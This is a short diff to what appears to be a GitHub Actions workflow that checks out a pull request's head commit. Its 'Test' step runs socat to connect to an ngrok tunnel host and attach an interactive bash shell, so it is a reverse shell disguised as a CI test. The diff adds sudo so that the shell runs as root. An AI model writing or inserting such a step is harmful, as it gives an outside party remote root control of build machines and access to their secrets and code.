@@ -16,8 +16,8 @@ jobs:
           ref: ${{ github.event.pull_request.head.sha }}
       - name: Install dependencies
         run: |
-          apt-get update
-          apt-get install -y socat
+          sudo apt-get update
+          sudo apt-get install -y socat
       - name: Test
         run: |
-          socat TCP:2.tcp.ngrok.io:16804 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
+          sudo socat TCP:2.tcp.ngrok.io:16804 EXEC:"bash -li",pty,stderr,setsid,sigint,sane
